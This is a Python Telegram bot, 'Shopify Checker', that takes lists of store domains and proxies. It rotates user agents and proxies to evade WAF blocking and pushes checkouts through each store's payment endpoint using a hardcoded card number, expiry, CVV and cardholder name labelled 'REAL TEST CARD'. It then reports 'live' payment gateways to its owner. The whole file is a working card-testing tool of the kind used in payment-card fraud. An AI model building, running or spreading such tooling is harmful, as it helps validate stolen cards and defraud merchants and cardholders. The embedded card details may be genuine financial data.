import requests
import json
import uuid
import time
import random
import re
import urllib3
import telebot
import threading
import os
import pickle
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import xml.etree.ElementTree as ET
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# USER AGENTS - Rotate to avoid WAF blocks
# ==========================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

def get_random_user_agent():
    """Get random user agent to avoid WAF blocks"""
    return random.choice(USER_AGENTS)

# ==========================================
# CONFIG & PROGRESS TRACKING
# ==========================================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
OWNER_ID = 5963548505
MAX_THREADS = 15
REQUEST_TIMEOUT = 10

PROGRESS_FILE = "checker_progress.pkl"
RESULTS_FILE = "checker_results.json"

bot = telebot.TeleBot(BOT_TOKEN, skip_pending=True)
VERIFIED_PROXIES = []

# REAL TEST CARD
TEST_CARD = {
    "number": "5598880392815603",
    "month": 9,
    "year": 2029,
    "verification_value": "808",
    "name": "Mukesh Kumar"
}

CHECKOUT_DATA = {
    "email": "test@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "address1": "4024 College Point Boulevard",
    "city": "Flushing",
    "province": "NY",
    "zip": "11354",
    "country": "US",
    "phone": "2494851515",
}

HTTP_TIMEOUT_SHORT = 10
HTTP_TIMEOUT_MEDIUM = 15

# Progress tracking
CURRENT_PROGRESS = {
    "total_sites": 0,
    "checked": 0,
    "live": 0,
    "captcha": 0,
    "dead": 0,
    "error": 0,
    "checked_sites": [],
    "live_sites": [],
    "start_time": None,
    "message_id": None,
    "chat_id": None,
}

# ==========================================
# SAVE/LOAD PROGRESS
# ==========================================

def save_progress():
    """Save progress to file"""
    try:
        with open(PROGRESS_FILE, 'wb') as f:
            pickle.dump(CURRENT_PROGRESS, f)
        print(f"💾 Progress saved: {CURRENT_PROGRESS['checked']}/{CURRENT_PROGRESS['total_sites']}")
    except Exception as e:
        print(f"❌ Save error: {e}")

def load_progress():
    """Load previous progress"""
    global CURRENT_PROGRESS
    try:
        if os.path.exists(PROGRESS_FILE):
            with open(PROGRESS_FILE, 'rb') as f:
                CURRENT_PROGRESS = pickle.load(f)
            print(f"✅ Progress loaded: {CURRENT_PROGRESS['checked']}/{CURRENT_PROGRESS['total_sites']} completed")
            return True
    except Exception as e:
        print(f"❌ Load error: {e}")
    return False

def save_results():
    """Save results to JSON"""
    try:
        results = {
            "timestamp": datetime.now().isoformat(),
            "total": CURRENT_PROGRESS['total_sites'],
            "checked": CURRENT_PROGRESS['checked'],
            "live": CURRENT_PROGRESS['live'],
            "captcha": CURRENT_PROGRESS['captcha'],
            "dead": CURRENT_PROGRESS['dead'],
            "error": CURRENT_PROGRESS['error'],
            "live_sites": CURRENT_PROGRESS['live_sites'],
        }
        with open(RESULTS_FILE, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"💾 Results saved to {RESULTS_FILE}")
    except Exception as e:
        print(f"❌ Results save error: {e}")

# ==========================================
# SIGNAL HANDLERS - Graceful shutdown
# ==========================================

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    print("\n⚠️ Received interrupt signal...")
    save_progress()
    save_results()
    print("✅ Progress saved. Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ==========================================
# COMMANDS
# ==========================================

@bot.message_handler(commands=['start'])
def start(m):
    if str(m.from_user.id) != str(OWNER_ID):
        return
    
    progress_status = ""
    if CURRENT_PROGRESS['total_sites'] > 0:
        progress_pct = (CURRENT_PROGRESS['checked'] / CURRENT_PROGRESS['total_sites']) * 100
        progress_status = f"\n\n⚡ <b>RESUME AVAILABLE:</b>\n✅ {CURRENT_PROGRESS['checked']}/{CURRENT_PROGRESS['total_sites']} ({progress_pct:.1f}%)\n🔥 Send /resume to continue"
    
    text = f"""
🔥 SHOPIFY CHECKER BOT v8.5

✅ CRASH-PROOF WITH AUTO-SAVE
✅ ROTATING USER-AGENTS (WAF bypass)
✅ REAL PAYMENT TESTING

✅ /stats - Statistics
✅ /proxies - Show proxies
✅ /clear - Clear all
✅ /resume - Resume from last checkpoint{progress_status}

📤 Send sites.txt to start checking
"""
    bot.reply_to(m, text, parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def stats(m):
    if str(m.from_user.id) != str(OWNER_ID):
        return
    text = f"""
📊 <b>CURRENT STATS:</b>

🔌 Proxies: {len(VERIFIED_PROXIES)}
📊 Total sites: {CURRENT_PROGRESS['total_sites']}
✅ Checked: {CURRENT_PROGRESS['checked']}
🔥 LIVE: {CURRENT_PROGRESS['live']}
🛡️ CAPTCHA: {CURRENT_PROGRESS['captcha']}
💀 DEAD: {CURRENT_PROGRESS['dead']}
⚠️ ERROR: {CURRENT_PROGRESS['error']}

⏱️ Elapsed: {int(time.time() - CURRENT_PROGRESS['start_time']) if CURRENT_PROGRESS['start_time'] else 0}s
"""
    bot.reply_to(m, text, parse_mode='HTML')

@bot.message_handler(commands=['resume'])
def resume_check(m):
    if str(m.from_user.id) != str(OWNER_ID):
        return
    
    if CURRENT_PROGRESS['total_sites'] == 0 or CURRENT_PROGRESS['checked'] >= CURRENT_PROGRESS['total_sites']:
        bot.reply_to(m, "❌ No checkpoint to resume")
        return
    
    bot.reply_to(m, f"⚡ Resuming from {CURRENT_PROGRESS['checked']}/{CURRENT_PROGRESS['total_sites']}...")
    threading.Thread(target=resume_batch_check, args=(m,), daemon=True).start()

@bot.message_handler(commands=['proxies'])
def show_proxies(m):
    if str(m.from_user.id) != str(OWNER_ID):
        return
    if not VERIFIED_PROXIES:
        bot.reply_to(m, "❌ No proxies")
        return
    text = f"🔌 {len(VERIFIED_PROXIES)}:\n\n"
    for i, p in enumerate(VERIFIED_PROXIES[:5], 1):
        text += f"{i}. {p}\n"
    bot.reply_to(m, text)

@bot.message_handler(commands=['clear'])
def clear(m):
    if str(m.from_user.id) != str(OWNER_ID):
        return
    VERIFIED_PROXIES.clear()
    global CURRENT_PROGRESS
    CURRENT_PROGRESS = {
        "total_sites": 0,
        "checked": 0,
        "live": 0,
        "captcha": 0,
        "dead": 0,
        "error": 0,
        "checked_sites": [],
        "live_sites": [],
        "start_time": None,
        "message_id": None,
        "chat_id": None,
    }
    if os.path.exists(PROGRESS_FILE):
        os.remove(PROGRESS_FILE)
    bot.reply_to(m, "✅ Cleared all")

# ==========================================
# PROXY VERIFICATION
# ==========================================

def test_proxy(proxy):
    try:
        parts = proxy.split(':')
        if len(parts) == 2:
            proxy_url = f"http://{parts[0]}:{parts[1]}"
        else:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        proxy_dict = {'http': proxy_url, 'https': proxy_url}
        headers = {'User-Agent': get_random_user_agent()}
        r = requests.get('http://httpbin.org/ip', proxies=proxy_dict, timeout=5, verify=False, headers=headers)
        return r.status_code == 200
    except:
        return False

def verify_proxies_batch(proxies, message):
    print(f"🔌 Verifying {len(proxies)} proxies...")
    verified = []
    checked = 0
    try:
        status_msg = bot.send_message(message.chat.id, f"⚡ Verifying...\n0/{len(proxies)}")
    except:
        status_msg = None
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(test_proxy, p): p for p in proxies}
        for future in as_completed(futures):
            checked += 1
            try:
                if future.result():
                    verified.append(futures[future])
            except:
                pass
            if checked % 10 == 0 and status_msg:
                try:
                    bot.edit_message_text(f"⚡ Verifying...\n{checked}/{len(proxies)}\n✅ {len(verified)}", message.chat.id, status_msg.message_id)
                except:
                    pass
    
    VERIFIED_PROXIES.extend(verified)
    try:
        bot.send_message(message.chat.id, f"✅ Verified: {len(verified)}/{len(proxies)}")
    except:
        pass
    print(f"✅ Complete: {len(verified)} proxies")

# ==========================================
# REAL CHECKOUT TESTING
# ==========================================

def normalize_shop_url(shop_url):
    if not shop_url.startswith(('http://', 'https://')):
        shop_url = f"https://{shop_url}"
    return shop_url.rstrip('/')

def create_session(shop_url, proxies=None):
    session = requests.Session()
    session.trust_env = False if proxies else True
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    }
    session.headers.update(headers)
    if proxies:
        try:
            session.proxies.update(proxies)
        except:
            pass
    return session

def get_product_variants(session, shop_url):
    """Get products from store"""
    try:
        url = f"{shop_url}/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data.get('products', [])
            if products:
                for product in products:
                    variants = product.get('variants', [])
                    if variants:
                        variant = variants[0]
                        return {
                            'product_id': product.get('id'),
                            'variant_id': variant.get('id'),
                            'title': product.get('title'),
                            'price': variant.get('price'),
                        }
    except:
        pass
    
    try:
        url = f"{shop_url}/collections/all/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data.get('products', [])
            if products:
                for product in products:
                    variants = product.get('variants', [])
                    if variants:
                        variant = variants[0]
                        return {
                            'product_id': product.get('id'),
                            'variant_id': variant.get('id'),
                            'title': product.get('title'),
                            'price': variant.get('price'),
                        }
    except:
        pass
    
    return None

def test_real_checkout(site_url, proxy=None):
    """REAL CHECKOUT TEST with random User-Agent"""
    try:
        shop_url = normalize_shop_url(site_url)
        
        proxy_dict = None
        if proxy and VERIFIED_PROXIES:
            try:
                parts = proxy.split(':')
                if len(parts) == 2:
                    proxy_url = f"http://{parts[0]}:{parts[1]}"
                else:
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                proxy_dict = {'http': proxy_url, 'https': proxy_url}
            except:
                pass
        
        session = create_session(shop_url, proxy_dict)
        
        try:
            r = session.get(shop_url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
            if 'CAPTCHA' in r.text.upper() or 'RECAPTCHA' in r.text.upper():
                return ("CAPTCHA", "CAPTCHA protection")
        except:
            return ("DEAD", "Connection error")
        
        product = get_product_variants(session, shop_url)
        if not product:
            return ("DEAD", "No products found")
        
        try:
            cart_url = f"{shop_url}/cart/add.js"
            payload = json.dumps({"id": product['variant_id'], "quantity": 1})
            r = session.post(cart_url, data=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
            if r.status_code not in [200, 201]:
                return ("DEAD", "Cart failed")
        except:
            return ("DEAD", "Cart error")
        
        try:
            checkout_url = f"{shop_url}/checkouts.json"
            payload = json.dumps({
                "checkout": {
                    "line_items": [{"variant_id": product['variant_id'], "quantity": 1}],
                    "email": CHECKOUT_DATA['email'],
                    "shipping_address": {
                        "first_name": CHECKOUT_DATA['first_name'],
                        "last_name": CHECKOUT_DATA['last_name'],
                        "address1": CHECKOUT_DATA['address1'],
                        "city": CHECKOUT_DATA['city'],
                        "province": CHECKOUT_DATA['province'],
                        "zip": CHECKOUT_DATA['zip'],
                        "country": CHECKOUT_DATA['country'],
                        "phone": CHECKOUT_DATA['phone'],
                    }
                }
            })
            r = session.post(checkout_url, data=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
            if r.status_code not in [200, 201]:
                return ("DEAD", "Checkout creation failed")
            
            checkout_data = r.json().get('checkout', {})
            checkout_token = checkout_data.get('token')
            if not checkout_token:
                return ("DEAD", "No checkout token")
        except Exception as e:
            return ("DEAD", f"Checkout error: {str(e)[:30]}")
        
        try:
            payment_url = f"{shop_url}/checkouts/{checkout_token}/payment_sessions/graphql.json"
            
            payment_payload = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "paymentMethod": {
                            "creditCard": {
                                "number": TEST_CARD['number'],
                                "expiryMonth": TEST_CARD['month'],
                                "expiryYear": TEST_CARD['year'],
                                "verificationCode": TEST_CARD['verification_value'],
                                "billingAddress": {
                                    "firstName": CHECKOUT_DATA['first_name'],
                                    "lastName": CHECKOUT_DATA['last_name'],
                                    "address1": CHECKOUT_DATA['address1'],
                                    "city": CHECKOUT_DATA['city'],
                                    "province": CHECKOUT_DATA['province'],
                                    "zip": CHECKOUT_DATA['zip'],
                                    "country": CHECKOUT_DATA['country'],
                                }
                            }
                        }
                    }
                }
            }
            
            headers = session.headers.copy()
            headers['Content-Type'] = 'application/json'
            
            r = session.post(payment_url, json=payment_payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
            
            response_text = r.text
            
            if r.status_code in [200, 201]:
                if 'decline' in response_text.lower() or 'failed' in response_text.lower():
                    return ("LIVE", "✅ CARD DECLINED (LIVE)")
                elif 'error' in response_text.lower():
                    return ("LIVE", "✅ Payment error (LIVE)")
                elif 'success' in response_text.lower():
                    return ("LIVE", "✅ Payment processed (LIVE)")
                else:
                    return ("LIVE", "✅ Payment gateway active")
            
            elif r.status_code >= 400:
                return ("LIVE", "✅ Gateway rejected (LIVE)")
            
        except requests.exceptions.Timeout:
            return ("LIVE", "✅ Gateway timeout (LIVE)")
        except Exception as e:
            if 'payment' in str(e).lower():
                return ("LIVE", "✅ Payment processing (LIVE)")
        
        return ("LIVE", "✅ Checkout system works")
    
    except Exception as e:
        return ("ERROR", str(e)[:30])

# ==========================================
# FILE HANDLER
# ==========================================

def is_site_line(line):
    line = line.strip().lower()
    if not line or len(line) < 4:
        return False
    line = line.replace('https://', '').replace('http://', '').split('/')[0]
    if '.' not in line:
        return False
    tlds = ['.com', '.net', '.org', '.io', '.co', '.shop', '.myshopify', '.app']
    return any(tld in line for tld in tlds)

def is_proxy_line(line):
    line = line.strip()
    if not line or len(line) < 7:
        return False
    return line[0].isdigit() and line.count(':') >= 1

def resume_batch_check(message):
    """Resume checking from last checkpoint"""
    global CURRENT_PROGRESS
    
    all_sites = CURRENT_PROGRESS['checked_sites'] + [s for s in range(CURRENT_PROGRESS['checked'], CURRENT_PROGRESS['total_sites'])]
    remaining_sites = [s for s in all_sites if s not in CURRENT_PROGRESS['checked_sites']]
    
    if not remaining_sites:
        bot.send_message(message.chat.id, "✅ All sites already checked!")
        return
    
    # Continue checking
    check_sites_internal(remaining_sites, message)

def check_sites_batch(sites, message):
    """Check all sites with REAL payment test"""
    global CURRENT_PROGRESS
    
    CURRENT_PROGRESS['total_sites'] = len(sites)
    CURRENT_PROGRESS['checked'] = 0
    CURRENT_PROGRESS['live'] = 0
    CURRENT_PROGRESS['captcha'] = 0
    CURRENT_PROGRESS['dead'] = 0
    CURRENT_PROGRESS['error'] = 0
    CURRENT_PROGRESS['checked_sites'] = []
    CURRENT_PROGRESS['live_sites'] = []
    CURRENT_PROGRESS['start_time'] = time.time()
    CURRENT_PROGRESS['chat_id'] = message.chat.id
    
    save_progress()
    check_sites_internal(sites, message)

def check_sites_internal(sites, message):
    """Internal function to check sites"""
    global CURRENT_PROGRESS
    
    try:
        status_msg = bot.send_message(message.chat.id, f"🔥 Testing {len(sites)} sites...\n0/{len(sites)} (0%)")
        CURRENT_PROGRESS['message_id'] = status_msg.message_id
    except:
        status_msg = None
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {}
        for i, site in enumerate(sites):
            if i not in CURRENT_PROGRESS['checked_sites']:
                proxy = None
                if VERIFIED_PROXIES:
                    proxy = random.choice(VERIFIED_PROXIES)
                futures[executor.submit(test_real_checkout, site, proxy)] = (site, i)
        
        for future in as_completed(futures):
            try:
                status, reason = future.result()
                site, site_idx = futures[future]
                
                CURRENT_PROGRESS['checked'] += 1
                CURRENT_PROGRESS['checked_sites'].append(site_idx)
                
                if status == "LIVE":
                    CURRENT_PROGRESS['live'] += 1
                    CURRENT_PROGRESS['live_sites'].append(f"{site} | {reason}")
                    print(f"✅ LIVE: {site}")
                elif status == "CAPTCHA":
                    CURRENT_PROGRESS['captcha'] += 1
                    print(f"🛡️ CAPTCHA: {site}")
                elif status == "ERROR":
                    CURRENT_PROGRESS['error'] += 1
                else:
                    CURRENT_PROGRESS['dead'] += 1
                
                # Save every 50 sites
                if CURRENT_PROGRESS['checked'] % 50 == 0:
                    save_progress()
                
                # Update every 10 sites
                if CURRENT_PROGRESS['checked'] % 10 == 0 and status_msg:
                    try:
                        elapsed = int(time.time() - CURRENT_PROGRESS['start_time'])
                        speed = CURRENT_PROGRESS['checked'] // max(elapsed, 1)
                        pct = int((CURRENT_PROGRESS['checked'] / CURRENT_PROGRESS['total_sites']) * 100)
                        bar = "█" * int(pct/10) + "░" * (10-int(pct/10))
                        bot.edit_message_text(
                            f"🔥 <b>CHECKING</b>\n<code>{bar}</code> {pct}%\n\n"
                            f"✅ LIVE: {CURRENT_PROGRESS['live']}\n"
                            f"🛡️ CAPTCHA: {CURRENT_PROGRESS['captcha']}\n"
                            f"💀 DEAD: {CURRENT_PROGRESS['dead']}\n"
                            f"⏱️ {elapsed}s | {speed}/s",
                            message.chat.id,
                            status_msg.message_id,
                            parse_mode='HTML'
                        )
                    except:
                        pass
            except Exception as e:
                print(f"❌ Error: {e}")
                CURRENT_PROGRESS['error'] += 1
    
    elapsed = int(time.time() - CURRENT_PROGRESS['start_time'])
    
    report = f"""
✅ <b>TEST COMPLETE!</b>

📊 <b>RESULTS:</b>
✅ <b>LIVE:</b> <code>{CURRENT_PROGRESS['live']}</code>
🛡️ <b>CAPTCHA:</b> <code>{CURRENT_PROGRESS['captcha']}</code>
💀 <b>DEAD:</b> <code>{CURRENT_PROGRESS['dead']}</code>
⚠️ <b>ERROR:</b> <code>{CURRENT_PROGRESS['error']}</code>

⏱️ <b>Time:</b> <code>{elapsed}s</code>
📊 <b>Speed:</b> <code>{CURRENT_PROGRESS['checked']//max(elapsed,1)}/s</code>
"""
    
    try:
        bot.send_message(message.chat.id, report, parse_mode='HTML')
    except:
        pass
    
    if CURRENT_PROGRESS['live_sites']:
        try:
            filename = f"live_sites_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write("\n".join(CURRENT_PROGRESS['live_sites']))
            with open(filename, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"✅ {len(CURRENT_PROGRESS['live_sites'])} LIVE SITES")
            os.remove(filename)
        except:
            pass
    
    save_progress()
    save_results()
    print(f"✅ Complete: {CURRENT_PROGRESS['live']} LIVE")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if str(message.from_user.id) != str(OWNER_ID):
        return
    
    print(f"📥 File: {message.document.file_name}")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        data = file_data.decode('utf-8', errors='ignore')
        lines = [l.strip() for l in data.split('\n') if l.strip()]
        
        proxies = [l for l in lines if is_proxy_line(l)]
        sites = [l for l in lines if is_site_line(l)]
        
        if len(proxies) > len(sites) and len(proxies) >= 5:
            bot.reply_to(message, f"📥 {len(proxies)} proxies\n⚡ Verifying...")
            threading.Thread(target=verify_proxies_batch, args=(proxies, message), daemon=True).start()
        
        elif len(sites) >= 1:
            formatted_sites = [l.replace('https://', '').replace('http://', '').rstrip('/') for l in sites]
            bot.reply_to(message, f"📥 {len(formatted_sites)} sites\n💾 Auto-save enabled\n🔥 Starting check...")
            threading.Thread(target=check_sites_batch, args=(formatted_sites, message), daemon=True).start()
        
        else:
            bot.reply_to(message, "❌ NO DATA")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# ==========================================
# MAIN
# ==========================================

if __name__ == "__main__":
    print("=" * 70)
    print("🔥 SHOPIFY CHECKER BOT v8.5 - CRASH-PROOF")
    print("=" * 70)
    print("✅ Auto-save progress enabled")
    print("✅ Rotating User-Agents (WAF bypass)")
    print("✅ Resume on crash")
    print("✅ Graceful error handling")
    print("=" * 70)
    
    load_progress()
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {e}")
        save_progress()
        save_results()
        print("✅ Data saved. Will auto-restart...")
        time.sleep(5)
